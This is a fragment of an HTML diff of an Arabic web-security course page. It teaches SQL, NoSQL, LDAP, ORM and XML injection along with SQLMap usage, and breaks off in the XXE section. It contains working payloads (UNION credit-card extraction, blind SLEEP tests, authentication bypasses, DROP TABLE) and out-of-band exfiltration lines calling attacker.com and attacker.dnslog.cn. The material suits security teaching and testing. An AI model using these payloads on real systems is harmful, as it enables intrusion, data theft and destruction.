+<div class="step-body"><p>صياغة Payload يحتوي عبارات SQL مصمَّمة لإثارة خطأ قاعدة بيانات — إضافة بناء جملة غير صالح أو التلاعب في استعلام موجود.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">ملاحظة رسائل الخطأ</div>
+<div class="step-body"><p>إرسال الـ Payload وملاحظة رسالة الخطأ المُرجَعة من قاعدة البيانات — توفّر معلومات قيّمة عن بنية ومحتوى قاعدة البيانات.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">استخراج البيانات</div>
+<div class="step-body"><p>تعديل الـ Payload لاستخراج معلومات محدَّدة من قاعدة البيانات بالاستفادة من رسائل الخطأ — أسماء مستخدمين، كلمات مرور، أو بيانات حساسة أخرى.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استغلال الثغرة</div>
+<div class="step-body"><p>استغلال المعلومات المُجمَّعة عبر Error-Based SQLi لتوسيع الاستغلال أو الحصول على وصول غير مصرَّح به.</p></div>
+</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">استغلال Union-Based SQL Injection</span></h2>
+<p>يستغل القدرة على استخدام عامل <code>UNION</code> في استعلامات SQL — يحدث لما التطبيق يفشل في التحقّق أو تنقية مدخلات المستخدم، ويسمح بحقن كود SQL خبيث في الاستعلام. يتطلّب تطابق عدد الأعمدة وأنواع بياناتها بين جمل SELECT المدموجة.</p>
+
+<div class="code-wrap"><span class="code-tag">union-based extraction example</span><pre><code># الاستعلام الأصلي:
+SELECT id, name FROM users WHERE id = '&lt;user_input&gt;'
+
+# الحمولة المحقونة:
+' UNION SELECT credit_card_number, 'hack' FROM credit_cards --
+
+# الاستعلام بعد الحقن:
+SELECT id, name FROM users WHERE id = '' UNION SELECT credit_card_number, 'hack' FROM credit_cards --
+# النتيجة هتشمل أرقام بطاقات ائتمان بجانب بيانات المستخدم الأصلية
+</code></pre></div>
+
+<h3>منهجية الاستغلال</h3>
+<ol>
+<li>تحديد مدخلات المستخدم المستخدَمة في استعلامات قاعدة البيانات</li>
+<li>اختبار المدخلات بحقن Payload بسيط (علامة اقتباس) وملاحظة الأخطاء أو السلوك غير المتوقَّع</li>
+<li>تحديد نقاط حقن عرضة — تجربة UNION SELECT أو شروط منطقية ومراقبة الفرق</li>
+<li>تأكيد الثغرة بحقن UNION SELECT كامل — لو الاستجابة فيها أعمدة أو بيانات إضافية، الثغرة مؤكَّدة</li>
+<li>تعداد قاعدة البيانات — حقن UNION SELECT بأسماء أعمدة وجداول مناسبة لاستخراج بنية قاعدة البيانات، باستخدام ORDER BY أو LIMIT لتضييق النتائج</li>
+</ol>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">استغلال Blind SQLi (Boolean & Time-Based)</span></h2>
+
+<h3>Time-Based SQL Injection</h3>
+<p>تقنية بتعتمد على التلاعب في استعلامات SQL لإدخال تأخيرات — المهاجم بيستنتج معلومات عن قاعدة البيانات بقياس التأخير في استجابة التطبيق.</p>
+<div class="code-wrap"><span class="code-tag">time-based delay injection</span><pre><code># الاستعلام الأصلي:
+SELECT * FROM users WHERE username = '[username]' AND password = '[password]';
+
+# الحمولة في حقل username:
+' OR SLEEP(5) -- '
+
+# الاستعلام بعد الحقن:
+SELECT * FROM users WHERE username = '' OR SLEEP(5) -- ' AND password = '[password]';
+# لو السيرفر استغرق 5 ثوانٍ إضافية في الاستجابة → نقطة الحقن عرضة لـ Time-Based SQLi
+</code></pre></div>
+
+<h3>Boolean-Based Blind SQL Injection</h3>
+<p>المهاجم بيستغل استجابة التطبيق لشروط منطقية لاستنتاج معلومات عن قاعدة البيانات — بيبعت استعلام SQL خبيث ويقيّم الاستجابة حسب نجاح أو فشل تنفيذ الاستعلام. بسؤال سلسلة من الأسئلة صح/خطأ وتحليل الاستجابات، المهاجم يقدر يبني تدريجيًا صورة كاملة عن بنية ومحتوى قاعدة البيانات.</p>
+<div class="callout tip">
+<div class="callout-label">أمثلة Payloads شائعة</div>
+<p><code>' AND 1=1 --</code> (شرط صحيح) مقابل <code>' AND 1=2 --</code> (شرط خاطئ) — الفرق في استجابة التطبيق (محتوى، حالة HTTP، أو حتى وقت التحميل) هو مؤشر الثغرة.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU8 -->
+<h2 id="lu8"><span class="num">08</span><span class="htext">منهجية اختبار SQL Injection الكاملة</span></h2>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">اكتشاف نقطة الدخول</div>
+<div class="step-body"><p>تحديد كل حقول إدخال المستخدم اللي بتتفاعل مع قاعدة البيانات، وفهم منطق التطبيق للتنبؤ ببنية استعلامات SQL المحتملة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">تحديد نوع DBMS</div>
+<div class="step-body"><p>استخدام كلمات مفتاحية SQL خاصة بأنظمة إدارة قواعد بيانات معيَّنة ومراقبة استجابة الموقع لتحديد نوع DBMS المستخدَم.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">اختبار أولي</div>
+<div class="step-body"><p>اختبار Payloads أساسية زي <code>' OR '1'='1</code> و<code>' AND '1'='2</code> ومراقبة الأخطاء أو المخرجات غير المتوقَّعة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">اختبار قائم على الأخطاء</div>
+<div class="step-body"><p>حقن Payloads تتسبّب عمدًا في أخطاء بناء جملة SQL والبحث عن رسائل خطأ تكشف نوع أو بنية قاعدة البيانات.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">اختبار Blind SQLi</div>
+<div class="step-body"><p>استخدام Payloads منطقية (<code>' AND 1=1 --</code> / <code>' AND 1=2 --</code>) وPayloads زمنية (<code>' OR IF(1=1, SLEEP(5), 0) --</code>) لاختبار الاستجابة بدون مخرجات مباشرة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">اختبار Union-Based</div>
+<div class="step-body"><p>تحديد عدد الأعمدة بزيادة قيم NULL تدريجيًا (<code>UNION SELECT NULL --</code>)، ثم اختبار استخراج البيانات (<code>UNION SELECT username, password FROM users --</code>).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">7</div>
+<div class="step-title">اختبار متقدّم</div>
+<div class="step-body"><p>اختبار OOB SQLi عبر استدعاءات DNS أو HTTP (مثل Burp Collaborator)، والبحث عن ثغرات من الدرجة الثانية (Second-Order) تُنفَّذ في استعلامات لاحقة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">8</div>
+<div class="step-title">اختبار آلي</div>
+<div class="step-body"><p>استخدام أدوات زي SQLMap أو Burp Suite أو OWASP ZAP لإجراء فحوصات آلية، مع تأكيد يدوي لتجنّب False Positives.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">9</div>
+<div class="step-title">التحقق والاستغلال</div>
+<div class="step-body"><p>التحقق من قابلية استغلال الثغرة فعليًا عبر استخراج بيانات أو تنفيذ إجراءات غير مصرَّح بها، وتوثيق التأثير والتوصيات.</p></div>
+</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU9 -->
+<h2 id="lu9"><span class="num">09</span><span class="htext">أساسيات SQLMap</span></h2>
+<p>أداة مفتوحة المصدر بتؤتمت عملية اكتشاف واستغلال ثغرات SQL Injection في تطبيقات الويب — بتدعم قواعد بيانات علائقية (MySQL، PostgreSQL، MSSQL، Oracle، SQLite، MariaDB) ودعم تجريبي لقواعد NoSQL (MongoDB، CouchDB).</p>
+
+<div class="callout warning">
+<div class="callout-label">نصيحة احترافية حاسمة</div>
+<p>دايمًا اختبر الحقن يدويًا أولًا، وبعدين وسّع اختبارك بـ SQLMap. لو شغّلت SQLMap تلقائيًا بالكامل من غير فهم مسبق، ممكن يختار استراتيجية استغلال غير فعّالة أو حتى يسقّط الخدمة البعيدة. ابدأ دايمًا بتحديد الثغرة يدويًا، وتحقّق من وجودها ونوعها بـ SQLMap بعدين — هيديك معلومات أدق عن الثغرة بالطريقة دي.</p>
+</div>
+
+<h3>سير عمل SQLMap الأساسي</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحديد نقاط الحقن</div>
+<div class="step-body"><p><code>sqlmap -u "http://example.com/login.php?id=1"</code> — SQLMap بيبعت Payloads اختبارية زي <code>' OR '1'='1</code> ويحلّل الاستجابة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">بصمة قاعدة البيانات</div>
+<div class="step-body"><p><code>--fingerprint</code> — بيحدّد نوع DBMS المستخدَم لتكييف أساليب الهجوم.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">حقن Payloads للتأكيد</div>
+<div class="step-body"><p>يختبر أنواع مختلفة (Error-based، Time-based، Boolean-based، UNION-based).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">استخراج البيانات</div>
+<div class="step-body"><p>بيجيب بنية قاعدة البيانات والجداول والبيانات لو الحقن مؤكَّد.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استغلال متقدّم</div>
+<div class="step-body"><p><code>--os-shell</code> — SQLMap يقدر يصعّد الهجوم للحصول على وصول على مستوى نظام التشغيل أو تنفيذ أوامر.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">sqlmap — basic syntax</span><pre><code>sqlmap -u &lt;URL&gt; -p &lt;Injection Parameter&gt; [options]
+
+# استهداف POST مع بيانات نموذج:
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
+
+# استخدام كوكي جلسة للمصادقة:
+sqlmap -u "http://example.com/product.php?id=1" --cookie="PHPSESSID=abc123"
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU10 -->
+<h2 id="lu10"><span class="num">10</span><span class="htext">SQLMap — التعداد والاستخدام المتقدم</span></h2>
+
+<h3>تعداد قاعدة البيانات</h3>
+<div class="code-wrap"><span class="code-tag">sqlmap — database enumeration</span><pre><code>sqlmap -u &lt;target&gt; --banner           # بصمة/اسم قاعدة البيانات
+sqlmap -u &lt;target&gt; --users            # تعداد مستخدمي DBMS
+sqlmap -u &lt;target&gt; --is-dba           # هل المستخدم الحالي DBA؟
+sqlmap -u &lt;target&gt; --dbs              # سرد قواعد البيانات
+sqlmap -u &lt;target&gt; -D users_db --tables           # سرد الجداول
+sqlmap -u &lt;target&gt; -D users_db -T user_credentials --columns  # سرد الأعمدة
+sqlmap -u &lt;target&gt; -D users_db -T user_credentials --dump     # استخراج البيانات
+</code></pre></div>
+
+<h3>تحديد تقنية الحقن (--technique)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الرمز</th><th>التقنية</th><th>الوصف</th></tr></thead>
+<tbody>
+<tr><td>B</td><td>Boolean-Based Blind</td><td>تقييم شروط صح/خطأ لاستنتاج المعلومات</td></tr>
+<tr><td>E</td><td>Error-Based</td><td>استخدام رسائل خطأ قاعدة البيانات لاستخراج المعلومات</td></tr>
+<tr><td>U</td><td>UNION-Based</td><td>استغلال عامل UNION لاستخراج البيانات</td></tr>
+<tr><td>S</td><td>Stacked Queries</td><td>تنفيذ عدة جمل SQL في استعلام واحد (لو مدعوم)</td></tr>
+<tr><td>T</td><td>Time-Based Blind</td><td>قياس تأخيرات الاستجابة لاستنتاج شروط صح/خطأ</td></tr>
+<tr><td>Q</td><td>Inline Queries</td><td>استخدام استعلامات فرعية للاستخراج (أقل شيوعًا)</td></tr>
+</tbody>
+</table></div>
+
+<h3>خيارات --level و --risk</h3>
+<ul>
+<li><strong>--level (1-3):</strong> عمق الاختبار — 1 (افتراضي: GET/POST بس)، 2 (يشمل Headers زي Cookies وUser-Agent)، 3 (معاملات إضافية زي Referer وHeaders مخصَّصة)</li>
+<li><strong>--risk (1-3):</strong> عدوانية الاختبار — 1 (افتراضي: اختبارات غير مدمّرة)، 2 (استعلامات ممكن تأثّر بسيط على السيرفر)، 3 (إجراءات مزعزعة محتملة زي Stacked Queries أو عمليات تستغرق وقت طويل)</li>
+</ul>
+<div class="callout danger">
+<div class="callout-label">تحذير احترافي</div>
+<p>تشغيل SQLMap بـ level وrisk عاليين وتركه يختبر تلقائيًا بدون فهم مسبق للتطبيق ده سلوك غير احترافي وممكن يسبّب مشاكل فعلية لبنية العميل التحتية. ادرس التطبيق بعناية قبل استخدام <code>--risk</code> العالي.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">intercepted request + options summary</span><pre><code># استخدام طلب مُعترَض من Burp:
+sqlmap -r &lt;request_file&gt; -p parameter [options]
+
+# أهم الخيارات:
+--fingerprint        تحديد نوع وإصدار DBMS
+--tamper=&lt;script&gt;    تطبيق سكريبتات Tamper لتجاوز WAF
+--os-shell           فتح شل نظام تشغيل لو ممكن
+--file-read=&lt;path&gt;   قراءة ملفات من سيرفر الهدف
+--batch              تشغيل بدون تفاعل (بدون أسئلة)
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU11 -->
+<h2 id="lu11"><span class="num">11</span><span class="htext">حقن SQL خارج النطاق (OOB SQLi)</span></h2>
+<p>نوع من SQLi المهاجم فيه مش بيعتمد على استجابة مباشرة (In-Band) من التطبيق — بدل كده، بيخلّي قاعدة البيانات تتواصل مع سيرفر خارجي يتحكّم فيه، عبر قنوات زي DNS أو HTTP، لتسريب بيانات أو تأكيد الثغرة. مفيد جدًا لما التطبيق مش بيعرض رسائل خطأ، أو الاستجابات مش قابلة للملاحظة، أو قاعدة البيانات الهدف قادرة على إرسال طلبات صادرة.</p>
+
+<h3>كيف يعمل</h3>
+<ol>
+<li>تحديد نقطة إدخال عرضة للحقن</li>
+<li>صياغة Payload خبيث يجبر قاعدة البيانات على إرسال طلب DNS أو HTTP خارجي</li>
+<li>إعداد سيرفر خارجي (DNS أو HTTP) لمراقبة والتقاط الطلبات الصادرة</li>
+<li>عند معالجة قاعدة البيانات للـ Payload، بتبعت طلب لسيرفر المهاجم — مسرّبة بيانات أو مؤكّدة الثغرة</li>
+</ol>
+
+<div class="method-grid">
+<div class="method-card"><span class="mnum">DNS-Based</span><div class="mtitle">تسريب عبر استعلامات DNS</div><div class="mdesc">إجبار قاعدة البيانات على حلّ اسم نطاق، وإرسال استعلام DNS لسيرفر مُتحكَّم فيه (مثال DBMS: MySQL <code>LOAD_FILE</code>، MSSQL <code>OPENROWSET</code>، Oracle <code>UTL_HTTP</code>). ميزة: استدعاءات DNS خفيفة، تعمل عبر الجدران النارية، وأصعب في الكشف.</div></div>
+<div class="method-card"><span class="mnum">HTTP-Based</span><div class="mtitle">تسريب عبر طلبات HTTP</div><div class="mdesc">إجبار قاعدة البيانات على إرسال طلب HTTP لسيرفر المهاجم (مثال DBMS: MSSQL <code>xp_cmdshell</code>، PostgreSQL <code>COPY</code>، MySQL <code>LOAD_FILE</code>).</div></div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">dns-based oob sqli payload</span><pre><code># المعامل الهدف:
+http://example.com/product.php?id=1
+
+# الحمولة (MySQL LOAD_FILE):
+1' UNION SELECT LOAD_FILE('\\\\attacker.dnslog.cn\\file') --
+
+# مراقبة سجلات DNS Server (مثل dnslog.cn):
+Query: attacker.dnslog.cn   ← تأكيد الثغرة
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">http-based oob sqli payload</span><pre><code># الحمولة (MSSQL xp_cmdshell):
+'; EXEC xp_cmdshell 'curl http://attacker.com?data=(SELECT@@version)' --
+
+# ما يصل لسيرفر المهاجم (مثلًا Burp Collaborator أو Ngrok):
+GET /?data=Microsoft SQL Server 2019
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU12 -->
+<h2 id="lu12"><span class="num">12</span><span class="htext">حقن SQL من الدرجة الثانية (Second-Order)</span></h2>
+
+<h3>الفرق عن First-Order SQLi</h3>
+<p>في SQLi التقليدي (First-Order)، المهاجم بيبعت مدخل خبيث مباشرة، والتطبيق بيعالجه ويرجّع استجابة فورية قابلة للاستغلال — التفاعل زي نظام "تحدي-استجابة" فوري. Second-Order SQLi مختلف: الـ Payload مش بيتنفّذ فورًا عند الحقن الأولي — بدل كده بيتخزّن في قاعدة البيانات وبيتنفّذ لاحقًا لما استعلام أو وظيفة تانية في التطبيق تعالجه.</p>
+<div class="callout warning">
+<div class="callout-label">السيناريو الأخطر</div>
+<p>بيستغل الحالات اللي فيها مدخلات المستخدم بتتنظّف أثناء الاستعلام الأولي، لكن بتُستخدَم لاحقًا بدون تنظيف في عملية قاعدة بيانات تانية — المطوّرون غالبًا ما بيتوقعوش إن بيانات مخزَّنة ومُنظَّفة سابقًا ممكن تكون خطيرة.</p>
+</div>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">مرحلة الحقن</div>
+<div class="step-body"><p>المهاجم بيحدّد حقل إدخال عرضة ويخزّن Payload خبيث من غير ما يتنفّذ فورًا.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">مرحلة التفعيل</div>
+<div class="step-body"><p>لاحقًا، التطبيق بيسترجع البيانات المخزَّنة ويستخدمها في استعلام تاني بدون تنظيف مناسب — الحمولة الخبيثة بتتنفّذ في العملية الثانوية دي.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">التأثير</div>
+<div class="step-body"><p>تسريب بيانات، تصعيد صلاحيات، أو اختراق كامل للنظام، حسب الغرض من الاستعلام الثاني.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">second-order sqli example — stored username triggers query later</span><pre><code># مرحلة 1 — التسجيل بـ username خبيث (يُخزَّن كنص بعد تنظيفه ظاهريًا):
+'); DROP TABLE users; --
+
+# مرحلة 2 — لما الأدمن يعرض بيانات المستخدم لاحقًا، التطبيق بيبني استعلام:
+SELECT * FROM users WHERE username = ''); DROP TABLE users; --';
+
+# الحمولة بتتنفّذ الآن → جدول users يُحذَف بالكامل
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU13 -->
+<h2 id="lu13"><span class="num">13</span><span class="htext">أساسيات NoSQL وحقنها</span></h2>
+
+<h3>مقدمة في قواعد بيانات NoSQL</h3>
+<p>نهج غير علائقي لتخزين واسترجاع البيانات — أكثر مرونة من قواعد البيانات العلائقية التقليدية، بيتعامل مع بيانات غير مهيكلة وشبه مهيكلة وسريعة التطوّر. ظهرت لتلبية الحاجة لقابلية التوسّع والأداء والمرونة.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>الميزة</th><th>SQL</th><th>NoSQL</th></tr></thead>
+<tbody>
+<tr><td>النوع</td><td>علائقي</td><td>غير علائقي</td></tr>
+<tr><td>نموذج التخزين</td><td>جداول بصفوف وأعمدة ثابتة</td><td>غير مهيكل — JSON، أزواج مفتاح-قيمة</td></tr>
+<tr><td>Schema</td><td>ثابت/صارم</td><td>ديناميكي/مرن</td></tr>
+<tr><td>قابلية التوسّع</td><td>رأسية (Vertical)</td><td>أفقية (Horizontal)</td></tr>
+<tr><td>اللغة</td><td>SQL المهيكلة</td><td>لغات استعلام غير مهيكلة خاصة بكل قاعدة</td></tr>
+</tbody>
+</table></div>
+
+<h3>حقن NoSQL (مثال MongoDB)</h3>
+<p>بيحدث لما المهاجم يتلاعب في استعلام قاعدة بيانات NoSQL عبر حقن مدخلات خبيثة — بيستغل ضعف معالجة التطبيق لمدخلات المستخدم المرسَلة إليه.</p>
+<div class="code-wrap"><span class="code-tag">mongodb nosql injection — auth bypass</span><pre><code>// الاستعلام العادي:
+var query = { username: username, password: password };
+var result = db.users.findOne(query);
+
+// حمولة المهاجم في حقل username:
+username: { $gt: "" }
+
+// $gt (أكبر من) بقيمة فارغة بيتلاعب في منطق الاستعلام
+// وبيرجّع أول سجل مستخدم في قاعدة البيانات — تجاوز تسجيل الدخول
+</code></pre></div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>Payload</th><th>الاستخدام</th></tr></thead>
+<tbody>
+<tr><td><code>username[$ne]=1&password[$ne]=1</code></td><td>لا يساوي (تجاوز مصادقة)</td></tr>
+<tr><td><code>username[$regex]=^adm&password[$ne]=1</code></td><td>فحص تعبير نمطي (تجاوز مصادقة)</td></tr>
+<tr><td><code>username[$regex]=.{25}&pass[$ne]=1</code></td><td>تحديد طول قيمة معيّنة</td></tr>
+<tr><td><code>username[$eq]=admin&password[$ne]=1</code></td><td>يساوي</td></tr>
+<tr><td><code>username[$ne]=admin&pass[$gt]=s</code></td><td>أكبر من</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU14 -->
+<h2 id="lu14"><span class="num">14</span><span class="htext">مقدمة في LDAP وحقنه</span></h2>
+
+<h3>ما هو LDAP؟</h3>
+<p>Lightweight Directory Access Protocol — بروتوكول لتعديل والاستعلام عن خدمات الدليل عبر TCP/IP. خدمة الدليل نظام شبيه بقاعدة بيانات متخصّصة بتخزّن وتنظّم البيانات في بنية هرمية — شائعة في بيئات المؤسسات لإدارة حسابات المستخدمين والمجموعات والصلاحيات.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>المنفذ</th><th>البروتوكول</th><th>الوصف</th></tr></thead>
+<tbody>
+<tr><td>389</td><td>LDAP</td><td>المنفذ الافتراضي للاتصال النصي الصريح</td></tr>
+<tr><td>636</td><td>LDAPS</td><td>المنفذ الافتراضي للاتصال الآمن (SSL/TLS)</td></tr>
+<tr><td>3268</td><td>Global Catalog</td><td>كتالوج شامل عبر LDAP نصي</td></tr>
+<tr><td>3269</td><td>Global Catalog LDAPS</td><td>كتالوج شامل عبر LDAP آمن</td></tr>
+</tbody>
+</table></div>
+
+<h3>بنية دليل LDAP</h3>
+<p>مُنظَّمة كشجرة هرمية (Directory Information Tree / DIT) — كل إدخال بيمثّل كائن واحد (مستخدم، مجموعة، مورد)، معرَّف بـ Distinguished Name (DN) فريد زي <code>cn=John Doe,ou=Users,dc=example,dc=com</code>، وموصوف بخصائص (Attributes) زي <code>cn</code> و<code>mail</code>.</p>
+
+<h3>صيغة LDAP (Syntax)</h3>
+<p>بتستخدم معاملات: <code>=</code> (يساوي)، <code>|</code> (أو منطقي)، <code>!</code> (ليس منطقي)، <code>&amp;</code> (و منطقي)، <code>*</code> (Wildcard). مثال: <code>(cn=J*)</code> بيجيب كل الإدخالات اللي الاسم فيها يبدأ بـ J.</p>
+
+<h3>حقن LDAP</h3>
+<p>بيحدث لما مدخلات المستخدم تُدمَج في استعلام LDAP بدون تنقية أو تحقّق مناسب — ده بيسمح للمهاجم يتلاعب في بنية الاستعلام، مما يؤدي لوصول غير مصرَّح أو تجاوز المصادقة أو استخراج معلومات دليل حساسة.</p>
+<div class="code-wrap"><span class="code-tag">ldap injection — authentication bypass</span><pre><code># الاستعلام الأصلي:
+(&(uid={username})(password={password}))
+
+# حقن المهاجم في username:
+*)(uid=*)
+
+# الاستعلام الناتج:
+(&(uid=*)(uid=*)(password={password}))
+# *) بتقفل الفلتر الأصلي مبكرًا وبتضيف شرط Wildcard جديد
+# → مطابقة كل المستخدمين → تجاوز المصادقة
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU15 -->
+<h2 id="lu15"><span class="num">15</span><span class="htext">مقدمة في ORM وحقنه</span></h2>
+
+<h3>ما هو ORM؟</h3>
+<p>Object-Relational Mapping — تقنية برمجية بتربط الأوبجكتس في التطبيق بجداول قاعدة البيانات، بتجرّد عمليات قاعدة البيانات وبتخلّي المطوّرين يتفاعلوا مع قاعدة البيانات بمفاهيم البرمجة الكائنية بدل كتابة SQL خام. أمثلة شائعة: SQLAlchemy (Python)، Hibernate (Java)، Entity Framework (.NET)، Django ORM، Eloquent (PHP).</p>
+
+<h3>ليه نستخدم ORM</h3>
+<ul>
+<li>جسر بين الكود الكائني وقواعد البيانات العلائقية</li>
+<li>تبسيط عمليات CRUD بدون الحاجة لمعرفة SQL مباشرة</li>
+<li>تقليل الكود المتكرّر وزيادة إنتاجية المطوّرين</li>
+<li>استقلالية قاعدة البيانات — نفس الكود يشتغل عبر محركات مختلفة</li>
+<li>تحسين الأمان عبر آليات زي Parameterized Queries المدمجة</li>
+</ul>
+
+<h3>حقن ORM</h3>
+<p>نوع من الحقن يستهدف تطبيقات بتستخدم إطار ORM — بيحدث لما مدخلات مستخدم غير موثوقة تُمرَّر بدون تنقية مناسبة لدوال استعلام ORM، مما يسمح للمهاجم يتلاعب في استعلام SQL المُولَّد من ORM في الخلفية.</p>
+<div class="callout danger">
+<div class="callout-label">أسباب شائعة</div>
+<p>بناء استعلامات ديناميكية بدمج سلاسل نصية مع مدخلات المستخدم (بدل استخدام API الـ ORM الآمن)، استخدام SQL خام داخل ORM بدون تنقية، وسوء استخدام المطوّرين لميزات بناء الاستعلامات اللي بتتخطّى حماية الـ ORM الافتراضية.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">orm injection — vulnerable dynamic query</span><pre><code># كود عرضة (بناء استعلام ديناميكي بدمج نصوص):
+user = User.query.filter(f"username = '{username}' AND password = '{password}'").all()
+
+# حمولة المهاجم:
+# username: admin' OR '1'='1
+# password: (أي قيمة)
+
+# الاستعلام الناتج:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything';
+# الشرط OR '1'='1' دايمًا صح → تجاوز مصادقة وتسجيل دخول كأول مستخدم في القاعدة
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU16 -->
+<h2 id="lu16"><span class="num">16</span><span class="htext">مقدمة في XML وحقنه</span></h2>
+
+<h3>ما هو XML؟</h3>
+<p>eXtensible Markup Language — لغة ترميز لتخزين ونقل البيانات بصيغة قابلة للقراءة ومستقلة عن المنصّة. لسه حي ومنتشر رغم ظهور بدائل زي YAML وJSON، وله استخدامات عملية واسعة (PDF، RSS، OOXML، SVG، وبروتوكولات زي SOAP وWebDAV).</p>
+
+<h3>بنية XML وDTD</h3>
+<p>مستندات XML بتُنظَّم كشجرة هرمية تبدأ من عنصر جذر واحد. <strong>DTD (Document Type Definition)</strong> بيحدّد بنية وعناصر وخصائص المستند — مستند XML بصياغة صحيحة يُسمى "Well Formed"، ولو اتحقّق مقابل DTD يُسمى "Valid" كمان.</p>
+
+<h3>XML Injection</h3>
+<p>ثغرة بتحدث لما المهاجم يتلاعب في مدخلات المستخدم لحقن بيانات XML خبيثة في مستند أو استعلام XML — ممكن تؤدّي لوصول غير مصرَّح، تسريب بيانات، أو تلاعب في سلوك التطبيق.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الوصف</th><th>التأثير</th></tr></thead>
+<tbody>
+<tr><td>XML Data Manipulation</td><td>تعديل بيانات XML للتلاعب في سلوك التطبيق</td><td>تلاعب بالبيانات، تجاوز مصادقة</td></tr>
+<tr><td>XML Tag Injection</td><td>حقن تاغات XML جديدة أو معدَّلة</td><td>تصعيد صلاحيات، مشاكل تحليل XML</td></tr>
+<tr><td>XPath Injection</td><td>حقن تعبيرات XPath خبيثة</td><td>وصول غير مصرَّح، تجاوز مصادقة</td></tr>
+<tr><td>XXE</td><td>استغلال الكيانات الخارجية في معالجة XML</td><td>كشف ملفات، SSRF، DoS</td></tr>
+<tr><td>Billion Laughs Attack</td><td>كيانات متكرّرة بتستنزف الموارد</td><td>حرمان من الخدمة (DoS)</td></tr>
+</tbody>
+</table></div>
+
+<h3>XML Tag Injection — مثال</h3>
+<div class="code-wrap"><span class="code-tag">xml tag injection example</span><pre><code>&lt;user&gt;
+  &lt;username&gt;admin&lt;/username&gt;
+  &lt;role&gt;&lt;admin/&gt;&lt;/role&gt;
+&lt;/user&gt;
+&lt;!-- حقن تاغ &lt;admin/&gt; ممكن يخدع التطبيق ويمنح المهاجم صلاحيات إدارية --&gt;
+</code></pre></div>
+<div class="callout note">
+<div class="callout-label">اختبار حقن XML</div>
+<p>حقن Metacharacters زي <code>' " &lt; &gt; &amp;</code> واختبار علامات الاقتباس المفردة/المزدوجة والـ Ampersand (<code>&amp;EntityName;</code>) والأقواس الزاوية لرصد أخطاء التحليل والتأكد من وجود الثغرة.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU17 -->
+<h2 id="lu17"><span class="num">17</span><span class="htext">XML External Entity (XXE)</span></h2>
+<p>أخطر نوع من هجمات XML Injection — بيحدث لما محلّل XML يعالج كيانات خارجية (External Entities) مُشار إليها في مستند XML، مما يسمح بـ: <strong>كشف بيانات</strong> (قراءة ملفات حساسة على السيرفر)، <strong>حرمان من الخدمة</strong> (إثقال السيرفر بحمولات خبيثة)، و<strong>SSRF</strong> (الوصول لموارد داخلية أو خارجية).</p>
+
+<h3>الكيانات الخاصة مقابل العامة</h3>
+<p>الكيانات الخاصة (Private) محصورة بمؤلف أو مجموعة مؤلفين، والكيانات العامة (Public) مصمَّمة لاستخدام أوسع. الكيانات الخاصة هي الأخطر لأنها بتسمح بكشف ملفات النظام المحلي والتلاعب في مخططات الشبكة والتطبيقات الداخلية.</p>
+
+<h3>استغلال XXE — تضمين الموارد (Resource Inclusion)</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تعريف كيان خارجي خبيث</div>
+<div class="step-body"><p>المهاجم بيصنع ملف XML خبيث فيه تعريف كيان خارجي بيشاور لملف محلي.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">الإشارة للكيان في جسم الطلب</div>
